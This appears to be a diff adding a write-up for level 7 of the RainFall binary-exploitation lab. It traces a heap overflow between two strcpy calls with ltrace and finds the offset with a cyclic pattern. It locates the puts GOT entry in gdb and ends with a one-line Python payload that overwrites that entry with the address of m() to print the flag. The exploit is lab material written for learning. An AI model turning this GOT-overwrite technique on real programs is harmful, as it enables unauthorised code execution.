@@ -1,0 +1,60 @@
+## Level7 
+
+At first the function call two strcpy that can overflow,  
+We use ltrace to intercept all action on strcpy.  
+```
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag bbbb
+__libc_start_main(0x8048521, 3, 0xbffff714, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                      = 0x0804a008
+malloc(8)                                      = 0x0804a018
+malloc(8)                                      = 0x0804a028
+malloc(8)                                      = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
+strcpy(0x37614136, "bbbb" <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+The overflow of the first strcpy go to the first arg of the second strcpy.  
+Using overflow pattern we found that the overflow is at the 20th caractere.   
+
+So we can use the second argument to write on the overflow that we give as the first argument.   
+
+Here we have m() function that print c var where we open the flag, so we know what function to call (arg2 to pass is the address of m function)   
+
+Donc la premiere instruction de m() : 080484f4
+
+As we look for an address that redirect to an address of an external function; to replace it to the address of m() start, we look through puts that is the function directly after the open.   
+```
+(gdb) info function puts
+All functions matching regular expression "puts":
+
+Non-debugging symbols:
+0x08048400  puts
+0x08048400  puts@plt
+0xb7e911a0  _IO_fputs
+0xb7e911a0  fputs
+0xb7e927e0  _IO_puts
+0xb7e927e0  puts
+0xb7e96ee0  fputs_unlocked
+0xb7f20750  putspent
+0xb7f21fa0  putsgent
+(gdb) disass *0x08048400
+No function contains specified address.
+(gdb) disass 0x08048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+(gdb) 
+```
+
+here we're go : 0x08048400 <+0>:	jmp    *0x8049928
+
+So let's try, 
+
+`./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')`
+
+0x080483a0
+0x0804843b
+
